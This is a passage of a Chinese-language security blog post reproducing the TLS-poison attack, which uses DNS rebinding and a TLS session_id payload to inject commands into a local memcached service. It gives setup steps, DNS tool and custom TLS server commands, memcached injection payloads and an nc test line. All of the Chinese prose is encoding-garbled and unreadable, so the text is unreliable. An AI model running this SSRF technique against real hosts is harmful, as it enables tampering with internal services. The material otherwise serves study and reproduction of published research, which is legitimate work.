è®°å½•ï¼Œæœ€ç»ˆä¼šåœ¨æ”»å‡»è€…å‡†å¤‡çš„ DNS æœåŠ¡å™¨æŸ¥è¯¢åˆ°æ”»å‡»è€…æä¾›çš„è§£æè®°å½•</li><li>æ­¤æ—¶ DNS æœåŠ¡å™¨æ­£å¸¸è¿”å›ç»“æœä¸º TLS Server åœ°å€å¹¶ä¸” TTL ä¸º 0 çš„å“åº”</li><li>å®¢æˆ·ç«¯å‘é€ Client Hello æ¶ˆæ¯</li><li>æœåŠ¡ç«¯è¿”å› Server Hello æ¶ˆæ¯ï¼Œå¹¶åœ¨å“åº”åŒ…ä¸­è®¾ç½® session_id ä¸º payload</li><li>è¿›è¡Œåç»­çš„TLSæ¡æ‰‹</li><li>æ¡æ‰‹å®Œæˆåè¿›è¡Œ http é€šä¿¡æ—¶ï¼Œæ”»å‡»è€… TLS Server è¿”å› 301 è·³è½¬åˆ° <a href="https://ssltest.jmaddux.com:11211" target="_blank" rel="noopener">https://ssltest.jmaddux.com:11211</a></li><li>å—å®³è€…å®¢æˆ·ç«¯é‡æ–°åŠ è½½ <a href="https://ssltest.jmaddux.com:11211" target="_blank" rel="noopener">https://ssltest.jmaddux.com:11211</a></li><li>ç†è®ºä¸Šç”±äºä¹‹å‰ DNS å“åº”çš„æŠ¥æ–‡ç»“æœä¸­ TTL ä¸º 0 ï¼Œå—å®³è€…å®¢æˆ·ç«¯ä¼šå†æ¬¡å‘ DNS æœåŠ¡å™¨è¯¢é—® ssltest.jmaddux.com çš„è§£æç»“æœ</li><li>æ­¤æ—¶æ”»å‡»è€…è®© DNS æœåŠ¡å™¨è¿”å›è§£æç»“æœä¸º 127.0.0.1 ä¸” TTL ä¸º 0</li><li>æ¥ç€ç”±äº TLS ä¼šè¯é‡ç”¨ï¼Œå—å®³è€…å®¢æˆ·ç«¯ä¼šä½¿ç”¨ä¹‹å‰çš„ session_id ä¹Ÿå°±æ˜¯ payload ï¼Œå¸¦ç€è¿™ä¸ª payload ä¸ 127.0.0.1:11211 è¿›è¡Œ TLS ä¼šè¯é‡ç”¨å°è¯•</li><li>payload è¢«å‘é€è‡³ 127.0.0.1:11211 ï¼Œè¾¾åˆ°æ”»å‡»è€…ç›®çš„ï¼Œä½†æ˜¯å› ä¸ºä¼šè¯é‡ç”¨å¤±è´¥ï¼Œå—å®³è€…å®¢æˆ·ç«¯ä¼šå¾—åˆ°ä¸€ä¸ª TLS Error çš„é”™è¯¯ã€‚è‡³æ­¤å®Œæˆæ‰€æœ‰æ”»å‡»æ­¥éª¤ã€‚</li></ol><h3 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h3><p>å¥½äº†ï¼Œæ¥ä¸‹æ¥å°±è®©æˆ‘ä»¬è‡ªå·±åŠ¨æ‰‹è¯•ä¸€è¯•å§ï¼ç”±äºæˆ‘æ˜¯ä½¿ç”¨çš„æ˜¯ä¸¤ä¸ª VPS ï¼Œæ²¡æœ‰åƒåŸä½œè€…ä¸€æ ·ä½¿ç”¨ docker ï¼Œæ‰€ä»¥ä½¿ç”¨ docker çš„åŒå­¦è¿˜è¯·è‡ªè¡Œæ‘¸ç´¢ã€‚å¹¶ä¸”ç”±äºå›½å†…å¤æ‚çš„ç½‘ç»œç¯å¢ƒï¼Œä¸ºäº†é¿å…ä¸å¿…è¦çš„éº»çƒ¦ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯ä¸¤å°å›½å¤–çš„ VPS ä½œä¸ºå­¦ä¹ ä½¿ç”¨ã€‚</p><p>æˆ‘å‡†å¤‡çš„æ˜¯ä¸€ä¸ªåŸŸåã€ä¸¤å° VPS ï¼Œå…¶ä¸­ä¸€å° VPS ä½œä¸º DNS æœåŠ¡å™¨ï¼Œå¦å¤–ä¸€å°ä½œä¸º TLS æœåŠ¡å™¨ï¼Œä¸¤å° VPS å‡æ˜¯ ubuntu 20.04 LTS ã€‚ä½œè€…ä»“åº“å¯¹äºå„è‡ª VPS çš„å‡†å¤‡å·¥ä½œå·²ç»ä»‹ç»å¾—æ¯”è¾ƒå…¨é¢äº†ï¼Œè¯¦ç»†å¯ä»¥å‚é˜…ï¼š<a href="https://github.com/jmdx/TLS-poison/#instructions" target="_blank" rel="noopener">https://github.com/jmdx/TLS-poison/#instructions</a> ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚</p><p>å”¯ä¸€å¯èƒ½éœ€è¦è¯´ä¸€ä¸‹çš„å°±æ˜¯è¯ä¹¦ç”³è¯·ï¼Œè¿™éƒ¨åˆ†ä½œè€…æ²¡æœ‰æåˆ°ï¼Œä¸ºäº†é¿å…ä¸€äº›åŒå­¦ä¸æ¸…æ¥šçš„ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ï¼ŒçŸ¥é“äº†çš„åŒå­¦å°±å¯ä»¥è·³è¿‡äº†ã€‚åœ¨ TLS æœåŠ¡å™¨ä¸Šçš„è¯ä¹¦å‡†å¤‡å·¥ä½œï¼š</p><ul><li>æŒ‰ç…§ <a href="https://certbot.eff.org/instructions" target="_blank" rel="noopener">https://certbot.eff.org/instructions</a> å®‰è£…å¯¹åº”çš„ cerbot </li><li>ç„¶åæ¨èä½¿ç”¨ DNS changllenges çš„æ–¹å¼å¼„è¯ä¹¦ï¼Œå½“ç„¶å…¶ä»–æ–¹å¼ä¹Ÿå¯ä»¥ã€‚<code>certbot --manual --preferred-challenges dns certonly</code></li><li>æŒ‰ç…§è‡ªå·±çš„ä¿¡æ¯å¡«å¥½åï¼Œä¼šæç¤ºéœ€è¦åˆ°ä½ çš„ DNS åŸŸåç®¡ç†å•†å¤„å¢åŠ ä¸€ä¸ª TXT è®°å½•ï¼Œç›´æ¥æ·»åŠ ä¸Šå»å°±å¥½äº†</li></ul><p>ç„¶åæœ€åæˆ‘ä»¬åœ¨åŸŸåçš„ DNS ä¸Šé…ç½®ä¸€ä¸‹å¦‚ä¸‹çš„åŸºæœ¬è®¾ç½®ï¼Œè¿™é‡Œä»¥åŸŸåä¸º example.com ä¸¾ä¾‹ï¼š</p><table><thead><tr><th>Type</th><th>Name</th><th>Value</th></tr></thead><tbody><tr><td>A</td><td>dns</td><td>(Your DNS VPS IP)</td></tr><tr><td>NS</td><td>tls</td><td>dns.example.com</td></tr><tr><td>TXT</td><td>_acme-challenge</td><td>(è¿™é‡Œæ˜¯ cerbot éªŒè¯ç”¨çš„å­—ç¬¦ä¸²)</td></tr></tbody></table><p>ç„¶åå°±å…ˆåœ¨ DNS VPS ä¸Šè¿è¡Œä½œè€…çš„ alternate-dns.py</p><p></p><figure class="highlight css hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-selector-tag">sudo</span> <span class="hljs-selector-tag">python3</span> <span class="hljs-selector-tag">alternate-dns</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">tls</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>,127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span> <span class="hljs-selector-tag">-b</span> 0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span> <span class="hljs-selector-tag">-t</span> <span class="hljs-selector-tag">Your_TLS_IP</span> <span class="hljs-selector-tag">-d</span> 8<span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>ç°åœ¨å°±ä¸‡äº‹ä¿±å¤‡å•¦ï¼</p><p>Letâ€™s Try!</p><h3 id="Original-Method"><a href="#Original-Method" class="headerlink" title="Original Method"></a>Original Method</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨ TLS VPS è¿›è¡Œä¸€ä¸‹æ“ä½œï¼Œé¦–å…ˆç”±äºä½œè€…åŸæ¥æ˜¯ä½¿ç”¨çš„æ˜¯ docker ï¼Œæ‰€ä»¥æœ‰äº›é…ç½®æˆ‘ä»¬éœ€è¦æ›´æ”¹ä¸€ä¸‹ï¼š</p><ul><li>åœ¨ client-hello-poisoning/custom-tls/src/main.rs#642 æ–‡ä»¶ä¸­ï¼Œéœ€è¦æŠŠ<code>redis://redis/</code>æ›´æ”¹ä¸ºè‡ªå·± TLS æœåŠ¡å™¨ä¸Šçš„ redis åœ°å€ï¼Œæ¯”å¦‚é»˜è®¤çš„æ˜¯ 127.0.0.1:6379 ï¼Œè¿™é‡Œæˆ‘ä»¬å°±æ”¹æˆ<code>redis://127.0.0.1:6379/</code></li><li>åœ¨åŸä½œè€…çš„æ–¹æ³•ä¸­ï¼Œ payload çš„è®¾ç½®éœ€è¦åœ¨ redis å½“ä¸­è®¾ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ redis è®¾ç½®å¥½ payload ï¼Œå¦‚ï¼š<code>set payload "\r\nset foo 0 0 12\r\ntls session \r\n"</code><ul><li>å…¶ä¸­ payload æ˜¯ redis å½“ä¸­çš„ key ï¼Œvalue æ˜¯çœŸæ­£å‘é€ç»™ memcached çš„å†…å®¹</li><li>Memcached éœ€è¦ä»¥ CRLF ä½œä¸ºæ•´ä¸ªå‘½ä»¤çš„ç»“æŸï¼Œå¹¶ä¸”å¯ä»¥å¿½ç•¥ä¹‹å‰çš„è¯­å¥é”™è¯¯ï¼Œè€ŒåŸä½œè€…çš„æ–‡æ¡£ä¸­ç»™å‡ºçš„ payload æ˜¯ä»¥ \r ç»“æŸï¼Œä¼šå¯¼è‡´å†™ä¸è¿› memcached ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œæˆ‘ä»¬è¿™é‡Œå¯ä»¥ä½¿ç”¨<code>"\r\nset foo 0 0 13\ni in ur cache\r\n"</code>ä½œä¸º payload ã€‚<ul><li>è¿™é‡Œå¦‚æœè¦ä¿®æ”¹çš„è¯è®°å¾—æ”¹ set å‘½ä»¤çš„ç¬¬ä¸‰ä¸ªæ•°å­—å‚æ•°ï¼Œè¯¥å‚æ•°ä¸ºè®¾ç½®æ•°æ®çš„é•¿åº¦ï¼Œå¦åˆ™ä¹Ÿä¼šå‘ç”Ÿé”™è¯¯å†™ä¸è¿› memcahedï¼Œæ¯”å¦‚<code>i in ur cache</code>è¿™é‡Œæ˜¯ 13 ä¸ªå­—èŠ‚ï¼Œå‰é¢çš„ç¬¬ä¸‰ä¸ªæ•°å­—å‚æ•°å°±éœ€è¦ä¸º 13 ï¼›å‰é¢çš„å‘½ä»¤ä¸æ•°æ®é—´çš„æ¢è¡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ LF ä½œä¸ºæ¢è¡Œï¼Œå¯ä»¥èŠ‚çœä¸€ä¸ªå­—èŠ‚é•¿åº¦ã€‚</li><li>è¿™é‡Œå»ºè®®å…ˆä½¿ç”¨<code>echo -e "\r\nset foo 0 0 13\ni in ur cache\r\n"|nc 127.0.0.1 11211</code>æ¥å°è¯•è‡ªå·±çš„ pyaload æ˜¯å¦èƒ½å¤Ÿå†™å…¥ memcached ï¼Œè¿™æ ·å¦‚æœåé¢å¤±è´¥äº†ï¼Œå¯¹åé¢çš„æ’é”™å¾ˆæœ‰ç”¨ï¼è‡³å°‘èƒ½æ’é™¤ä¸€ä¸ªå¯èƒ½å­˜åœ¨çš„é—®é¢˜ï¼</li></ul></li></ul></li><li>åœ¨åŸä½œè€…çš„æ–¹æ³•ä¸­ï¼Œä¸ºäº†è®© TLS è¿›è¡Œ Session Resumption ï¼Œä½œè€…ä½¿ç”¨äº† HTTP 301 è·³è½¬çš„æ–¹å¼è®© TLS è¿›è¡Œæ¢å¤ä¼šè¯ï¼Œè€Œè·³è½¬çš„åœ°å€åˆ™ä¹Ÿéœ€è¦æˆ‘ä»¬é€šè¿‡ redis æ¥è®¾ç½®ï¼Œè®¾ç½®çš„ key ä¸º redirect ï¼Œä»¥ example.com ä¸¾ä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·è¿›è¡Œè®¾ç½®ï¼š<code>set redirect  "https://tls.example.com:11211/"</code> ã€‚ï¼ˆè¿™é‡Œæ˜¯åŸä½œè€…æ²¡æœ‰åœ¨æ–‡æ¡£ä¸­åšå‡ºè¯´æ˜çš„åœ°æ–¹ï¼Œå¾—éœ€è¦é˜…è¯» main.rs ä»£ç æ‰èƒ½çœ‹å‡ºæ¥ï¼‰</li><li>è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯ä½œè€…è¿˜æä¾›äº†ä¸€ä¸ªå»¶è¿Ÿçš„é€‰é¡¹ï¼Œä»¥å…è¯·æ±‚è¿‡å¿«ï¼ˆè¿™é‡Œæœ‰ä¸€äº›å…¶ä»–åŸå› åœ¨æ­¤å¤„ï¼Œåç»­æˆ‘ä»¬ä¼šåˆ†æåˆ°ï¼‰ã€‚æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡ redis æ¥è®¾ç½® sleep è¿™ä¸ªå‚æ•°ï¼Œå¯ä»¥è¾¾åˆ°å»¶è¿Ÿå¤šå°‘ ms çš„æ•ˆæœï¼Œå¦‚æœä¸è®¾ç½®çš„è¯ï¼Œé»˜è®¤å€¼ä¸º 2000 ms ï¼Œä¸€èˆ¬è¿™ä¸ªæ•°å€¼å°±å¯ä»¥äº†ã€‚</li></ul><p>æˆ‘ä»¬è¿™é‡Œä»¥æ”»å‡»æœ¬åœ°çš„ memcached ä¸ºä¾‹ï¼Œåœ¨ ubuntu 20.04 LTS ä¸Šé»˜è®¤ä½¿ç”¨<code>apt install memcached</code>å®‰è£…å®Œæˆä¹‹åï¼Œå…¶é»˜è®¤ç›‘å¬åœ¨ 11211 ç«¯å£ä¸Šã€‚ä¹‹åæˆ‘ä»¬æŒ‰ç…§ä½œè€…çš„è¯´æ˜ï¼Œåœ¨ TLS VPS ä¸Šè¿è¡Œ TLSServer ï¼š</p><p></p><figure class="highlight jboss-cli hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target/debug/custom-tls -p 11211 <span class="hljs-params">--verbose</span> <span class="hljs-params">--certs</span> <span class="hljs-string">/path/to/fullchain.pem</span> <span class="hljs-params">--key</span> <span class="hljs-string">/path/to/privkey.pem</span> http</span><br></pre></td></tr></tbody></table></figure><p></p><p>å¥½äº†ï¼Œç°åœ¨æ‰ç»ˆäºæ˜¯ä¸€åˆ‡å‡†å¤‡å°±ç»ªäº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ curl è¿›è¡Œæµ‹è¯•äº†ã€‚è¿™é‡Œä¸ºäº†ç›´è§‚æŸ¥çœ‹ TLS Session Resumption çš„æ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥æ‰“å¼€ä¸¤ä¸ª wireshark æ¥è§‚å¯Ÿï¼Œä¸€ä¸ª wireshark ç›‘å¬åœ¨ä½ å¯¹å¤–é€šä¿¡çš„ç½‘ç»œæ¥å£ä¸Šï¼Œä¸€ä¸ª wireshark ç›‘å¬åœ¨æœ¬åœ°å›ç¯æ¥å£ä¸Šã€‚è¿è¡Œä¸€ä¸‹å‘½ä»¤è®¿é—®ä½ çš„ TLSServer ï¼š</p><p></p><figure class="highlight groovy hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="hljs-string">https:</span><span class="hljs-comment">//tls.example.com:11211/ -Lv</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>PS: æ³¨æ„è¿™é‡Œéœ€è¦åŠ ä¸Š<code>-L</code>å‚æ•°å…è®¸ curl è¿›è¡Œé‡å®šå‘ã€‚</p><p>æ¥ç€å¦‚æœç¬¬ä¸€æ¬¡ DNS å°±æŠŠæˆ‘ä»¬çš„åŸŸåè§£æåˆ° 127.0.0.1çš„è¯ï¼Œå¯ä»¥å¤šè¯•å‡ æ¬¡ç›´åˆ°åŸŸåè§£æåˆ°ä½ çš„ TLS VPS IP ä¸Šä¸ºæ­¢ï¼Œç„¶åç­‰å¾… 1 min å·¦å³ï¼Œå¦‚æœç½‘ç»œé¡ºç•…ï¼Œä¸€åˆ‡é¡ºåˆ©çš„è¯ï¼Œåœ¨ 1min å·¦å³å°±å¯ä»¥å®Œæˆæœ¬æ¬¡æ”»å‡»ã€‚æ”»å‡»æ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/1.png" alt=""></p><p>å…¶ä¸­å¯èƒ½ä¼šäº§ç”Ÿå‡ ç§ç»“æœ</p><ul><li>ç¬¬ä¸€ç§æœ€å¸¸è§çš„ç»“æœå°±æ˜¯<code>curl: (47) Maximum (50) redirects followed</code>ï¼Œè¡¨ç¤ºé‡å®šå‘æ¬¡æ•°å·²ç»è¶…è¿‡äº† curl é»˜è®¤çš„æœ€å¤§æ·±åº¦ 50 æ¬¡ï¼Œè¯´æ˜ DNS Rebinding æ²¡æœ‰å°† 127.0.0.1 è¿”å›åˆ°ç»™ Client ï¼Œè¿™é‡Œå› ç´ ä¹Ÿæ¯”è¾ƒå¤šï¼Œåæ–‡ä¼šæåˆ°ï¼Œå¯ä»¥è¯´è¿æ°”æ¯”è¾ƒå·®ï¼Œå¤šè¯•å‡ æ¬¡å°±è¡Œäº†ã€‚</li><li>ç¬¬äºŒç§ç»“æœæ˜¯<code>curl: (35) error:1408F10B:SSL routines:ssl3_get_record:wrong version number</code>ï¼Œå¦‚æœä¸Šé¢çš„ä¿¡æ¯ä½ è¿˜çœ‹åˆ°äº†<code>Trying 127.0.0.1</code>ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œå¾ˆæœ‰å¯èƒ½è¿™æ¬¡å°±æˆåŠŸäº†ï¼Œèµ¶ç´§å» memcached çœ‹çœ‹å§</li></ul><h3 id="The-Details-OF-Original-Method"><a href="#The-Details-OF-Original-Method" class="headerlink" title="The Details OF Original Method"></a>The Details OF Original Method</h3><p>åœ¨æ•´ç†è¿™ç¯‡æ–‡ç« ä¹‹å‰ï¼Œæˆ‘ä¹Ÿå‚è€ƒäº†å¾ˆå¤šæ–‡ç« ï¼Œè™½ç„¶è¿™äº›æ–‡ç« æ²¡æœ‰æ˜ç¡®çš„è¯´æ˜è¿™ä¸ªæ”»å‡»çš„æ”»å‡»è½½ä½“ï¼Œä¹Ÿå°±æ˜¯ Payload æœ€å¤§é•¿åº¦æ˜¯ 32 å­—èŠ‚ï¼Œä½†æ˜¯éƒ½ç»™äº†è®©æˆ‘äº§ç”Ÿäº†ä¸€ç§å…ˆå…¥ä¸ºä¸»çš„æ¦‚å¿µï¼Œåœ¨æˆ‘å°è±¡å½“ä¸­å®ƒå°±åªå±€é™äº 32 å­—èŠ‚ï¼Œç„¶åæˆ‘å»è¯¦ç»†å»çœ‹ä½œè€…å…¬å¼€çš„ PDF æ—¶ï¼Œå‘ç°ä½œè€…åœ¨æ¼”ç¤ºæ”»å‡» SMTP æ—¶æœ‰ä¸€ä¸ªå›¾æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/2.jpg" alt=""></p><p>å…¶ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ª payload å·²ç»è¿œè¿œè¶…è¿‡äº† 32 å­—èŠ‚ï¼Œç„¶åæˆ‘æŠ±ç€ç–‘æƒ‘å»åå¤æŸ¥çœ‹ä½œè€…å…¬å¸ƒçš„æ¼”è®²å½•åƒï¼Œå…¶ä¸­ä»–æœ‰è¿™ä¹ˆè¯´åˆ°ï¼ˆä½†æ„¿æˆ‘çš„è‹±è¯­å¬åŠ›ä»¥åŠ Youtube å­—å¹•è¶³å¤Ÿå‡†ç¡®ï¼‰ï¼š</p><blockquote><p>â€‹    It might seem too good to be ture but TLS actually provides us exactly that in the form of a session id. Most clients even persist this field for later use. Session ids are limited to 32 bytes as you can see but depending on the implementation you might have session ticket. This one is about 200 bytes but these can be up to around 65 kilobytes. But session ids and session tickets are mechanisms for a TLS client to go. Remember that cryptographic key exchange we did earlier letâ€™s just keep using that key in this new connection. TLS 1.3 includes a slightly more complicated but similar mechanism called a pre-shared key identity which pretty much does the smae thing for our purposes. All of these are about optimization since key exchange can be time consuming. But they provide a certain way for a server to tell whatever is connecting to it to persist some data for lighter use, almost like a cookie that lives in plain text. So itâ€™s perfect for the surf attack weâ€™re trying to do.</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæ”»å‡»æœ¬æ¥å°±å¯ä»¥åšåˆ°è¶…è¿‡ 32 å­—èŠ‚çš„åšæ³•ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¹‹å‰æ‰€è¯´çš„é‚£å‡ ç§ Session Resumption ï¼Œåªæœ‰ SessionID å±€é™äº 32 å­—èŠ‚ä»¥ä¸‹ã€‚</p><p>å¹¶ä¸”æŒ‰ç…§ä¸Šé¢æˆ‘ä»¬çš„å®éªŒç»“æœå…¶ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæŒ‰ç…§åŸæ¥ä½œè€…åœ¨å…¶ä»“åº“ README æè¿°çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä»å®è·µä¸­çœ‹å‡ºå¦‚ä¸‹å‡ ä¸ªç‚¹ï¼š</p><ul><li>åŒæ–¹é»˜è®¤ä½¿ç”¨ TLS 1.3 